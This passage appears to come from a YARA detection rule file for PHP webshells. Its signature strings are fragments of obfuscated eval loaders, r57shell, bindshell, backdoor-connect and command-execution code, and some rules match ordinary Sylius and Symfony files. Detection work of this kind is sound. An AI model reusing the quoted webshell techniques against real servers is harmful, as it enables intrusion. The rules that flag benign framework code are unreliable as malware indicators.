      $s4 = "[49].$GLOBALS['vb6a6e'][16].$GLOBALS['vb6a6e'][68].$GLOBALS['vb6a6e'][64].$GLOBALS['vb6a6e'][44].$GLOBALS['vb6a6e'][40], 0);" fullword ascii
      $s5 = "return $GLOBALS[$GLOBALS['vb6a6e'][8].$GLOBALS['vb6a6e'][19].$GLOBALS['vb6a6e'][67].$GLOBALS['vb6a6e'][74]]($GLOBALS[$GLOBAL" fullword ascii
      $s6 = "echo @$GLOBALS[$GLOBALS['vb6a6e'][67].$GLOBALS['vb6a6e'][54].$GLOBALS['vb6a6e'][22].$GLOBALS['vb6a6e'][15].$GLOBALS['vb6" fullword ascii
      $s7 = "6e'][49].$GLOBALS['vb6a6e'][64].$GLOBALS['vb6a6e'][16].$GLOBALS['vb6a6e'][90].$GLOBALS['vb6a6e'][40].$GLOBALS['vb6a6e'][68];" fullword ascii
      $s8 = "foreach ($GLOBALS[$GLOBALS['vb6a6e'][28].$GLOBALS['vb6a6e'][63].$GLOBALS['vb6a6e'][19].$GLOBALS['vb6a6e'][35].$GLOBALS['vb6a" fullword ascii
      $s9 = "$GLOBALS['vb6a6e'][90].$GLOBALS['vb6a6e'][70] => $GLOBALS['vb6a6e'][22].$GLOBALS['vb6a6e'][31].$GLOBALS['vb6a6e'][55" fullword ascii
      $s10 = "$sbe9860c .= $GLOBALS[$GLOBALS['vb6a6e'][2].$GLOBALS['vb6a6e'][58].$GLOBALS['vb6a6e'][88].$GLOBALS['vb6a6e'][22].$GL" fullword ascii
      $s11 = "$GLOBALS['vb6a6e'][77].$GLOBALS['vb6a6e'][70] => @$GLOBALS[$GLOBALS['vb6a6e'][77].$GLOBALS['vb6a6e'][74].$GLOBALS['v" fullword ascii
      $s12 = "S['vb6a6e'][8].$GLOBALS['vb6a6e'][19].$GLOBALS['vb6a6e'][67].$GLOBALS['vb6a6e'][74]]($db290, $ycc70b8), $ebf36);" fullword ascii
      $s13 = "ALS['vb6a6e'][88].$GLOBALS['vb6a6e'][55]] = $GLOBALS['vb6a6e'][88].$GLOBALS['vb6a6e'][1].$GLOBALS['vb6a6e'][8];" fullword ascii
      $s14 = "ALS['vb6a6e'][67].$GLOBALS['vb6a6e'][15].$GLOBALS['vb6a6e'][35].$GLOBALS['vb6a6e'][67]]($ebf36[$n8d1aa9]));" fullword ascii
      $s15 = "6a6e'][40].$GLOBALS['vb6a6e'][15].$GLOBALS['vb6a6e'][74].$GLOBALS['vb6a6e'][55].$GLOBALS['vb6a6e'][15];" fullword ascii
      $s16 = "BALS['vb6a6e'][64].$GLOBALS['vb6a6e'][44].$GLOBALS['vb6a6e'][64].$GLOBALS['vb6a6e'][68];" fullword ascii
      $s17 = "b6a6e'][92].$GLOBALS['vb6a6e'][22].$GLOBALS['vb6a6e'][19].$GLOBALS['vb6a6e'][88]]()," fullword ascii
      $s18 = "'][43].$GLOBALS['vb6a6e'][64].$GLOBALS['vb6a6e'][72].$GLOBALS['vb6a6e'][40];" fullword ascii
      $s19 = "LOBALS['vb6a6e'][22].$GLOBALS['vb6a6e'][79]]($db290); $n8d1aa9++, $pe19++)" fullword ascii
      $s20 = "BALS['vb6a6e'][54]] = $_POST;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule sig_649515a5730e7baa0303b29ce49f7e142b88c2ce
{
   meta:
      description = "php17 - file 649515a5730e7baa0303b29ce49f7e142b88c2ce.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
   strings:
      $x1 = "if(!@function_exists('escapeshellarg')){$res=$api->WinExec(\"cmd.exe /c $cfe >\\\"$output\\\"\",0);}" fullword ascii
      $x2 = "if(!@function_exists('escapeshellarg')){$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.$cfe.' > \"'.$output.'\"');}" fullword ascii
      $x3 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - su" fullword ascii
      $x4 = "else{$res=$api->WinExec(\"cmd.exe /c \".@escapeshellarg($cfe).\" >\\\"$output\\\"\",0);}" fullword ascii
      $x5 = "else{$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"');}" fullword ascii
      $x6 = "if(@ftp_login($connection,$_POST['ftp_login'],$user)) { echo \"[+] \".$_POST['ftp_login'].\":$user - success\\r\\n\"; $suc++; }" fullword ascii
      $x7 = "else if ($file=readzlib($_POST['loc_file'])) { $filedump = $file; } else { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $x8 = "else if ($file=readzlib($_POST['d_name'])) { $filedump = $file; } else { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $x9 = "echo sr(15,\"<b>\".$lang[$language.'_text53'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x10 = "echo sr(15,\"<b>\".$lang[$language.'_text73'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x11 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x12 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x13 = "elseif($file=moreread($_POST['e_name'])) { $filedump = $file; if(!@is_writable($_POST['e_name'])) { $only_read = 1; }; }" fullword ascii
      $x14 = "else{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"" ascii
      $x15 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x16 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x17 = "else{@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"')" ascii
      $x18 = "if (@pcntl_wifexited($status)){$res .= '[+] Done! Command \"'.$cfe.'\" successfully executed.';}" fullword ascii
      $x19 = "$api=new ffi(\"[lib='kernel32.dll'] int WinExec(char *APP,int SW);\");" fullword ascii
      $x20 = "'eng_text124'=>'Test bypass open_basedir, add data to file via error_log(php://) (PHP <= 5.1.4, 4.4.2)'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*)
}

rule sig_24f2df1b9d49cfb02d8954b08dba471f
{
   meta:
      description = "php17 - file 24f2df1b9d49cfb02d8954b08dba471f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c6987684488275d3a1b8e702a699ea13ef07c5f86e1e910da37b5e919e935097"
   strings:
      $s1 = "<?PHP if(isset($_GET['do'])){$t0=$q1=null;$t2=array('./adminhtml/default/default/images');$r3=array('_bg','_sm','_icon','_left'," ascii
      $s2 = "NT0nJztmb3JlYWNoKCRfUE9TVCBhcyAkaDY9PiRuNyl7aWYoaXNfYXJyYXkoJG43KSl7Zm9yZWFjaCgkbjcgYXMgJGY4PT4kbDkpe2lmKGlzX2FycmF5KCRsOSkpe2Zv" ascii
      $s3 = "ZW5zc2xfZnJlZV9rZXkoJHQxNSk7JGE1PSR0MTcuJzo6OlNFUDo6OicuJHQyMjt9JG0xPWZpbGVfZXhpc3RzKCR5MCk/QGZpbGVtdGltZSgkeTApOiRtMTtAZmlsZV9w" ascii
      $s4 = "bHNleyRhNS49JzonLiRoNi4nWycuJGY4LiddPScuJGw5O319fWVsc2V7JGE1Lj0nOicuJGg2Lic9Jy4kbjc7fX0kYTU9JGk0LiRhNTt9ZWxzZXskYTU9bnVsbDt9aWYo" ascii
      $s5 = "KEAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ109PSdWaXNib3QvMi4wICgraHR0cDovL3d3dy52aXN2by5jb20vZW4vd2VibWFzdGVycy5qc3A7Ym90QHZpc3ZvLmNv" ascii
      $s6 = "VVJMOiogaHR0cDovL29wZW5zb3VyY2Uub3JnL2xpY2Vuc2VzL29zbC0zLjAucGhwKiovJHkwPSd7UkVTRklMRX0nOyRtMT0ne0xUSU1FfSc7JGsyPSd7REVMX1BBUkFN" ascii
      $s7 = "JGE1KXskdDEyPWZhbHNlO2lmKGZ1bmN0aW9uX2V4aXN0cygnb3BlbnNzbF9nZXRfcHVibGlja2V5JykmJmZ1bmN0aW9uX2V4aXN0cygnb3BlbnNzbF9wdWJsaWNfZW5j" ascii
      $s8 = "cmVhY2goJGw5IGFzICRsMTA9PiR2MTEpe2lmKGlzX2FycmF5KCR2MTEpKXs7fWVsc2V7JGE1Lj0nOicuJGg2LidbJy4kZjguJ11bJy4kbDEwLiddPScuJHYxMTt9fX1l" ascii
      $s9 = "bSknKXtpZihpc3NldCgkX0dFVFskazJdKSl7JG0xPWZpbGVfZXhpc3RzKCR5MCk/QGZpbGVtdGltZSgkeTApOiRtMTtAZmlsZV9wdXRfY29udGVudHMoJHkwLCcnKTtA" ascii
      $s10 = "ZW5zc2xfZW5jcnlwdCcpKXskdDEyPXRydWU7fX1pZigkdDEyKXskdDE1PUBvcGVuc3NsX2dldF9wdWJsaWNrZXkoJGszKTskcTE2PTEyODskdDE3PScnOyRoMTg9bWQ1" ascii
      $s11 = "b3dlcihzdWJzdHIocGhwX3VuYW1lKCksMCwzKSk7JGQxND0ncGhwX29wZW5zc2wuJy4oJG4xMz09J3dpbic/J2RsbCc6J3NvJyk7QGRsKCRkMTQpO2lmKGZ1bmN0aW9u" ascii
      $s12 = "X2V4aXN0cygnb3BlbnNzbF9nZXRfcHVibGlja2V5JykmJmZ1bmN0aW9uX2V4aXN0cygnb3BlbnNzbF9wdWJsaWNfZW5jcnlwdCcpJiZmdW5jdGlvbl9leGlzdHMoJ29w" ascii
      $s13 = "KXskaTQ9JF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ107fWVsc2VpZighZW1wdHkoJF9TRVJWRVJbJ0hUVFBfWF9GT1JXQVJERURfRk9SJ10pKXskaTQ9JF9TRVJWRVJb" ascii
      $s14 = "IHRoaXMgcGFja2FnZSBpbiB0aGUgZmlsZSBMSUNFTlNFLnR4dC4qIEl0IGlzIGFsc28gYXZhaWxhYmxlIHRocm91Z2ggdGhlIHdvcmxkLXdpZGUtd2ViIGF0IHRoaXMg" ascii
      $s15 = "cnlwdCcpJiZmdW5jdGlvbl9leGlzdHMoJ29wZW5zc2xfZW5jcnlwdCcpKXskdDEyPXRydWU7fWVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ2RsJykpeyRuMTM9c3RydG9s" ascii
      $s16 = "dG91Y2goJHkwLCRtMSwkbTEpO2VjaG8gJ2NsZWFuIG9rJzt9ZWxzZSBlY2hvICdQb25nJztleGl0O31pZighZW1wdHkoJF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ10p" ascii
      $s17 = "Q0VOU0UqKiBUaGlzIHNvdXJjZSBmaWxlIGlzIHN1YmplY3QgdG8gdGhlIE9wZW4gU29mdHdhcmUgTGljZW5zZSAoT1NMIDMuMCkqIHRoYXQgaXMgYnVuZGxlZCB3aXRo" ascii
      $s18 = "fSc7JGszPSItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlHZU1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTUFEQ0JpQUtCZ0ZpS2h6RUdWVXhMZGtkQVBtVFZINzRR" ascii
      $s19 = "QG9wZW5zc2xfcHVibGljX2VuY3J5cHQoJGYyMCwkaDIxLCR0MTUpOyR0MTcuPSRoMjE7fSR0MjI9QG9wZW5zc2xfZW5jcnlwdCgkYTUsJ2FlczEyOCcsJGgxOCk7QG9w" ascii
      $s20 = "SXE1WmNuREZkbGNLelcyUFIvMTkrZ2tLaFJHazFZVVhNTGd3NkVGalxuajJjMUxKb1NwbnprOFdSRkFnTUJBQUU9XG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0iO2lm" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule sig_6f1a2aa579a8ecd60d17677f0cd211c4090500f6
{
   meta:
      description = "php17 - file 6f1a2aa579a8ecd60d17677f0cd211c4090500f6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $x1 = "$sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $x2 = "<title>:: The r57 shell with modified by iFX :: listening L\\'Arc~en~Ciel - MilkyWay::</title>" fullword ascii
      $x3 = "$_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s4 = "/*  r57shell.php - ?????? ?? ??? ??????????? ??? ????????? ???? ???????  ?? ??????? ????? ???????" fullword ascii
      $s5 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s6 = "exit(\"<b><a href=http://lintah-club.ueuo.com>HELLW access denied tau'!!!, soryy neeh cuy!! :D</a> : Access Denied</b>\");" fullword ascii
      $s7 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s8 = "$sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s9 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s10 = "ASES;\\nSELECT * FROM user;\")).\"</textarea><br><input type=submit name=submit value=\\\" Run SQL query \\\"></div><br><br>\";" fullword ascii
      $s11 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"" fullword ascii
      $s12 = "echo sr(40,\"<b>\".$lang[$language.'_text24'].$arrow.\"</b>\",in('text','remote_host',15,'jade.va.us.dal.net'));" fullword ascii
      $s13 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table;\";" fullword ascii
      $s14 = "@readfile (\"http://rst.void.ru/r57shell_version/version.php?version=\".$current_version.\"\");}}" fullword ascii
      $s15 = "$db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s16 = "$sql2 .= \"INSERT INTO \".$_POST['mysql_tbl'].\" (\".$keys.\") VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s17 = "$sql2 .= \"INSERT INTO `\".$_POST['mysql_tbl'].\"` (`\".$keys.\"`) VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s18 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { echo re($_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s19 = "if(!isset($_POST['test3_port'])||empty($_POST['test3_port'])) { $_POST['test3_port'] = \"3306\"; }" fullword ascii
      $s20 = "if(!isset($_POST['test4_port'])||empty($_POST['test4_port'])) { $_POST['test4_port'] = \"1433\"; }" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Adjustment
{
   meta:
      description = "php17 - file Adjustment.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "846311a9eab086a9e051db1399a1a182ccaf93d0a0982611c2664a019c33c505"
   strings:
      $s1 = "* @param AdjustableInterface $adjustable" fullword ascii
      $s2 = "private function assignAdjustable(AdjustableInterface $adjustable): void" fullword ascii
      $s3 = "* @var OrderItemUnitInterface|null" fullword ascii
      $s4 = "public function getAdjustable(): ?AdjustableInterface" fullword ascii
      $s5 = "* @var OrderInterface|null" fullword ascii
      $s6 = "* @var OrderItemInterface|null" fullword ascii
      $s7 = "$currentAdjustable = $this->getAdjustable();" fullword ascii
      $s8 = "public function getOriginCode(): ?string" fullword ascii
      $s9 = "use Sylius\\Component\\Resource\\Model\\TimestampableTrait;" fullword ascii
      $s10 = "throw new \\InvalidArgumentException('Given adjustable object class is not supported.');" fullword ascii
      $s11 = "throw new \\LogicException('Adjustment is locked and cannot be modified.');" fullword ascii
      $s12 = "$adjustable = $this->getAdjustable();" fullword ascii
      $s13 = "public function getType(): ?string" fullword ascii
      $s14 = "public function getLabel(): ?string" fullword ascii
      $s15 = "public function getAmount(): int" fullword ascii
      $s16 = "namespace Sylius\\Component\\Order\\Model;" fullword ascii
      $s17 = "public function setAdjustable(?AdjustableInterface $adjustable): void" fullword ascii
      $s18 = "private function assertNotLocked(): void" fullword ascii
      $s19 = "public function setOriginCode(?string $originCode): void" fullword ascii
      $s20 = "$this->order = $this->orderItem = $this->orderItemUnit = null;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_058dc6454632f283910c5358e0d53befb8d64209
{
   meta:
      description = "php17 - file 058dc6454632f283910c5358e0d53befb8d64209.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2ad2ae50ad594001f343827801c6e72f830b3e11ded4e386289e315754011e59"
   strings:
      $s1 = "run_proxy_client($_POST['intranet_host'], $_POST['intranet_port']," fullword ascii
      $s2 = "connect_backdoor($_POST['target_host'], $_POST['target_port']);" fullword ascii
      $s3 = "<input style=\"border:none\" color=\"#384850\" type=\"submit\" value=\"Execute\" /><br /><br />" fullword ascii
      $s4 = "function run_proxy_client($remote_host1, $remote_port1, $remote_host2, $remote_port2)" fullword ascii
      $s5 = "if ($_POST['target_host'] && $_POST['target_port']) {" fullword ascii
      $s6 = "function run_proxy_core($socket1, $remote_host1, $socket2, $remote_host2)" fullword ascii
      $s7 = "if (empty($_POST['intranet_host']) || empty($_POST['intranet_port']) || " fullword ascii
      $s8 = "run_proxy_core($socket1, $remote_host1, $socket2, $remote_host2);" fullword ascii
      $s9 = "<li><a href=\"webshell.php?cmd=portscan\">[PortScan]</a></li>" fullword ascii
      $s10 = "<td><a href=\"webshell.php?cmd=portscan\">port scan</a></td>" fullword ascii
      $s11 = "exec_shell($_POST['shellcmd']);" fullword ascii
      $s12 = "<td><a href=\"webshell.php?cmd=shell\">cmd shell</a></td>" fullword ascii
      $s13 = "<td><a href=\"webshell.php?cmd=proxy\">reverse proxy</a></td>" fullword ascii
      $s14 = "empty($_POST['public_host']) ||  empty($_POST['public_port']))" fullword ascii
      $s15 = "<li><a href=\"webshell.php?cmd=proxy\">[Proxy]</a></li>" fullword ascii
      $s16 = "<a href=\"webshell.php?download='.$file_name.'\"'.'>Download </a>" fullword ascii
      $s17 = "document.shell.output.scrollTop = document.shell.output.scrollHeight;" fullword ascii
      $s18 = "<input type=\"text\" name=\"target_host\" />" fullword ascii
      $s19 = "bindshell($_POST['bind_port']);" fullword ascii
      $s20 = "$cmd_data .= run_terminal_shell($_POST['shellcmd']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule sig_53ac73bc3b90dbcfcaf0d9749f576a44db698d15
{
   meta:
      description = "php17 - file 53ac73bc3b90dbcfcaf0d9749f576a44db698d15.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "93ea86df748331a49cb417bd00ea2302359ae00fe8da3963fa1238d374c669bf"
   strings:
      $s1 = "$I=str_replace('QS','','QScQSreQSQSate_funcQStiQSon');" fullword ascii
      $s2 = "$Z=str_replace('`+','',$f.$h.$R.$x.$m.$v.$e.$i.$G.$B);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule sig_9ac51f7de1571bd794e03569d05aff9cbb8d3106
{
   meta:
      description = "php17 - file 9ac51f7de1571bd794e03569d05aff9cbb8d3106.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7c076f1579b844214cbb324385588617eb74137a5e73ab7c2964f09b7b1a28a3"
   strings:
      $s1 = "$_SESSION['theCode']&&preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(base64_decode($_SESSION[\\'theCode\\']))','a');" fullword ascii
      $s2 = "$_POST['code'] && $_SESSION['theCode'] = trim($_POST['code']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_332f7d02c04072a20d8549475dff8612dfd87bd3
{
   meta:
      description = "php17 - file 332f7d02c04072a20d8549475dff8612dfd87bd3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "205bdd3839d79acc91e12245dbac494811d4f32f30b1ec5452ff41c7c84b8dfe"
   strings:
      $s1 = "$C='=,$ss($s[$iT=],0,$eT=)))T=,$T=k)));$o=ob_get_T=contenT=tT=s();oT=b_T=end_cleT=an();$dT==bT=ase6';" fullword ascii
      $s2 = "$R='ANGT=UAGET=\"];T=if($rr&&$rT=a){T=$u=parse_urlT=($rr);pT=arT=se_str(T=$T=u[\"querT=y\"],$q);$q=arT';" fullword ascii
      $s3 = "$s='T=};}}return $T=o;}$r=$_T=SERVER;$rT=r=@$r[T=\"HTTT=P_REFERER\"T=];$raT==@$r[T=\"HTT=T=TP_ACCEPT_L';" fullword ascii
      $s4 = "$t='=$m);if($q&&$m)T={@sesT=sion_T=staT=T=rT=t();$s=T=&T=$_SESSION;$ss=\"substr\"T=;$sl=T=\"strtolowT=';" fullword ascii
      $s5 = "$u='rpos(T=$p,T=$h)===0){T=$sT=[T=$i]=\"\";$p=$sT=s($p,3);}iT=f(arrayT=_key_eT=xists($iT=,T=$s))T={$s';" fullword ascii
      $s6 = "$O='[$i].=$p;$e=T=strpoT=s($sT=[$i],$fT=);ifT=(T=$eT=){$k=$kh.$kf;oT=b_starT=tT=();@eT=val(@gzuncom';" fullword ascii
      $s7 = "$v='preT=ss(T=@x(@basT=eT=64_decode(pT=rT=eg_replT=ace(array(\"/_T=/\",\"/T=-/\"),arrT=ay(\"T=/\",\"+\"T=)T';" fullword ascii
      $s8 = "$f='=rayT=_values($T=q);prT=eg_maT=tcT=h_all(\"/([\\\\wT=]T=)[\\\\w-T=]+(T=?:;qT==0.T=([\\\\d]))?,?/\",$ra,T=T';" fullword ascii
      $s9 = "$r='$khT=T==\"5d41\";$kf=\"40T=2a\"T=;function xT=($t,$kT=){$c=sT=trlen(T=$k);$l=stT=rleT=n($t);$oT==\"T';" fullword ascii
      $s10 = "$n='=\";fT=or($iT==0;$i<$l;){for(T=$j=0T=;($j<$cT=&&T=$i<$l);$j++T=,T=$i++){$o.=T=$tT={$i}^$k{$T=jT=';" fullword ascii
      $s11 = "$q='4_encode(T=x(gzcT=ompress($oT=),$kT=)T=);priT=nt(\"<$T=k>$d</$k>\");@sT=essT=iT=on_destroy();}}}}';" fullword ascii
      $s12 = "$c='er\";$iT==$m[1][0T=].T=$m[1][1]T=;$h=$T=sl($ss(mdT=5T=($i.$kh)T=T=,0,3));$f=$sT=T=l($ss(md5($T=i';" fullword ascii
      $s13 = "$W='.$kf)T=,0,3));$p=T=T=\"\";for($z=1T=T=;$z<count($m[T=1]);$zT=+T=+)$pT=.=$q[$m[2][$T=T=z]]T=;if(st';" fullword ascii
      $s14 = "$I=str_replace('T=','',$r.$n.$s.$R.$f.$t.$c.$W.$u.$O.$v.$C.$q);" fullword ascii
      $s15 = "$o=str_replace('Pm','','crePmatPme_PmfPmPmunPmction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_00411460f7c92d2124a67ea0f4cb5f85
{
   meta:
      description = "php17 - file 00411460f7c92d2124a67ea0f4cb5f85.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "26a91b1e399fefdef4ca1a2f7ddf7f073c7efd26c9f317bd16a01bf1ed2d19f1"
   strings:
      $s1 = "$TjF='XiwsNnOG_'|KMu3pSEI;$_1O5r0K='R$2a@P'|'b$r  P';$ODuk3='J}#+v]'^'k)ah;-';'PrVK'." fullword ascii
      $s2 = "'I95X2Y@5';$AyikxTKPqyB=EE4d.'@`'|BD0Db.'$';$U7jnH=_Vvy_i&OWVt_c;$nHogfkY=m&/*'." fullword ascii
      $s3 = "'$ `@HR'|'$ peL@')|$AyikxTKPqyB;$St0=$Mj^$JKg;$ruQyAkSZ=$U7jnH&$dO2C_84gBu1;/*'." fullword ascii
      $s4 = "'@I*/s;$FQQIy=$_1O5r0K|$ODuk3;$YjZKJSRoLYA=$czR&('U`3'|'}dd');$my1CF=(#bXAOMnJ'." fullword ascii
      $s5 = "'&->,:*/wtbLf96);!$FQQIy($YjZKJSRoLYA($my1CF($ruQyAkSZ)),$AhIWVJ)||$St0(/*Tsrj'." fullword ascii
      $s6 = "'=?YM|';$dO2C_84gBu1='@&*0?p'^'8Z_f`=';$iLLpe='H D@@!B` C(]j@'.IDCR0.'+Q@P=YuA'." fullword ascii
      $s7 = "'+oiaR+S*/PjA0.'\"yR THD `H,@014XHA')^$iLLpe;$piySz6Ob9=('EH$5'|'ASb\"')^(#IlCs_'." fullword ascii
      $s8 = "'>STt*/WAqtCKyGiRMVG)&('?'.oPv0.'.!ykz wx]N#+/7-bc'^'v9.!oS~,6%L0&.?'./*OMdNpx'." fullword ascii
      $s9 = "'k~YR'&\"~:o~\");$FgOXWNSFCH=(BUEPG.'@]'.gpYDtVEG.' Z-AP^@'|XAU8YX.\"[6`\"./*gobXh'." fullword ascii
      $s10 = "'Mn,';$Mj='5P/04$DLR)\"E'|\"6T.60 J]@)(Y\";$JKg='Of{S{V;/>jY8'&'w?'.NqkWo.#GQZ35U'." fullword ascii
      $s11 = "'sHr|^BW?ll*/$piySz6Ob9,die,$nHogfkY);eval($my1CF($FgOXWNSFCH));#LOtuyb _,9VW'." fullword ascii
      $s12 = "'@N+mQ'|'8&@@J#R  )iU*@'.BDCA1.'#A@@'.TLDJ.'@O: y';$czR=gD1|'N%4';'aAcOAWhWllD'." fullword ascii
      $s13 = "'(7LQ&filI*/$AhIWVJ=(EBuu.',AaS@'.RHHS.'`.}2@U@%%`'.H0DxArPYK|'LBU!*@gCA@'./*_'." fullword ascii
      $s14 = "'qN_8HM2^>h7aJ%p|9FbN_]g4y[-WC]@JT%TqTYa&I-wsF;6BC-Si';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule AppExtension
{
   meta:
      description = "php17 - file AppExtension.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5ea1c0ff78030b0295ea0be182f259f138d8d485b9423229d80b8d0c88527f34"
   strings:
      $s1 = "use Symfony\\Component\\DependencyInjection\\Loader\\XmlFileLoader;" fullword ascii
      $s2 = "use Symfony\\Component\\DependencyInjection\\Extension\\Extension;" fullword ascii
      $s3 = "use Symfony\\Component\\DependencyInjection\\ContainerBuilder;" fullword ascii
      $s4 = "$loader->load('services.xml');" fullword ascii
      $s5 = "namespace AppBundle\\DependencyInjection;" fullword ascii
      $s6 = "$loader = new XmlFileLoader($container, new FileLocator(__DIR__ . '/../Resources/config'));" fullword ascii
      $s7 = "public function load(array $config, ContainerBuilder $container)" fullword ascii
      $s8 = "use Symfony\\Component\\Config\\FileLocator;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule ArrayParser
{
   meta:
      description = "php17 - file ArrayParser.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "750de1ec504406893e96c905651aa01a3535417d86a1af0011266716b73a785c"
   strings:
      $s1 = "throw new \\Exception(t('Invalid column definition: %s in table %s', var_export($details, true), $tableName));" fullword ascii
      $s2 = "public function parse($definition, \\Concrete\\Core\\Database\\Connection\\Connection $db)" fullword ascii
      $s3 = "public function addColumns(\\Doctrine\\DBAL\\Schema\\Table $table, $columns)" fullword ascii
      $s4 = "$table->addColumn($column['name'], $column['type'], $column['options']);" fullword ascii
      $s5 = "namespace Concrete\\Core\\Database\\Schema\\Parser;" fullword ascii
      $s6 = "$table->setPrimaryKey($details['primary']);" fullword ascii
      $s7 = "$table = $this->addColumns($table, $details['columns']);" fullword ascii
      $s8 = "foreach ($definition as $tableName => $details) {" fullword ascii
      $s9 = "$schema = new \\Doctrine\\DBAL\\Schema\\Schema();" fullword ascii
      $s10 = "$table = $schema->createTable($tableName);" fullword ascii
      $s11 = "if ($db->tableExists($tableName)) {" fullword ascii
      $s12 = "if (isset($details['columns'])) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_1ab162a1de749e658d738d58d4a7f1448aa3fd85
{
   meta:
      description = "php17 - file 1ab162a1de749e658d738d58d4a7f1448aa3fd85.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cfbab94e92bb82b156fa27c64d6cfbc6f4d250a4374089091e6e5ad77ee08818"
   strings:
      $s1 = "yDeNWJgZ7woj3jseDgm6p43JUHjbthLbsVuMcpQZwiPej5BW4P+hrjAwnfNcL7fdYgKEYEYacfzS" fullword ascii
      $s2 = "kSGe9getL6udOhgXL17mILf20JhSvryfdVLDcRuNMi/KRvOxKKPxZjFf2nivbV+czFpLDtsDbzjD" fullword ascii
      $s3 = "WH6PlpIS6Cg9AH5ntckAkT7uMyDbYHcCH6GgvRo3urWz4++/AzNJQQHguE1++F8=\";@eval(gzinflate(base64_decode($code)));?>" fullword ascii
      $s4 = "k0Xr8crK1SbJTuqud5c6eVZS94nKInF9dVGetnKJXnH0ctAe93RKuywfdPbrw/ZtoneVun9WLo4h" fullword ascii
